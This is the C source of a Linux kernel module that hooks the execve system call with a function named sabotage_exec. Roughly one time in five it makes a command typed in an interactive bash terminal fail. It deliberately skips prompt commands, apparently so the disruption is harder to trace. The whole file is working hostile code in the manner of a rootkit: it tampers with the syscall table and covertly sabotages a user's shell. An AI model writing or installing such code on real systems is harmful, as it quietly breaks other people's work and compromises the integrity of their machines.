#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/string.h>
#include <linux/fdtable.h>
#include <linux/random.h>  
#include "hooks.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ilevi");
MODULE_DESCRIPTION("Linux Kernel Hook");
MODULE_VERSION("1.0");

asmlinkage long (*original_exec)(const char* pathname, char * const argv[], char * const envp[]);

static int is_tty(struct file* file) {
    if (file == NULL) {
        return 0;
    }
    return S_ISCHR(file->f_inode->i_mode);
}

static int is_bash(struct task_struct* process) {
    return memcmp(process->comm, "bash", 4) == 0;
}

static int should_fail_exec(void) {
    struct fdtable* filestable = NULL;
    if (!is_bash(current)) {
        return 0;
    }

    // We do not was to fail commands that run as part of the PROMPT_COMMAND
    // An easy workaround is to check if stdout is a tty (terminal)
    filestable = files_fdtable(current->files);
    if (!is_tty(filestable->fd[1])) {
        return 0;
    }

    return get_random_int() % 5 == 0;
}

asmlinkage long sabotage_exec(const char* pathname, char * const argv[], char * const envp[]) {
	if (should_fail_exec()) {
        return -ENOEXEC;
	}
	return original_exec(pathname, argv, envp);

}

static int __init module_entry(void)
{
	original_exec = hook_syscall(__NR_execve, sabotage_exec);

    printk(KERN_INFO "lkh loaded\n");

	return 0;
}

static void __exit module_cleanup(void)
{
	unhook_syscall(__NR_execve, original_exec);

    printk(KERN_INFO "lkh has finished\n");
}

module_init(module_entry);
module_exit(module_cleanup);